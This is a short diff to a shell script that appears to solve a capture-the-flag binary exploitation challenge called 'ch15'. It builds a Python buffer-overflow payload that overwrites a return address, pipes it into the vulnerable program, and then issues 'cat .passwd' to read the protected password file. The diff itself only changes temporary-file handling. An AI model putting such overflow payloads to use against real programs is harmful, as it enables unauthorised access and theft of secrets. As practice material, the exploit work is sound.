@@ -1,6 +1,8 @@
 # ssh ... < commands.sh
 
-cat << 'EOF' > /tmp/ch15_data.py
+f=$(mktemp)
+chmod g+r $f
+cat << 'EOF' > $f
 import struct
 import sys
 
@@ -10,4 +12,4 @@ s += struct.pack('<Q', 0x8048516)
 sys.stdout.buffer.write(s)
 EOF
 
-(python3 /tmp/ch15_data.py; echo; cat <<< 'cat .passwd') | ./ch15
+(python3 $f; echo; cat <<< 'cat .passwd') | ./ch15
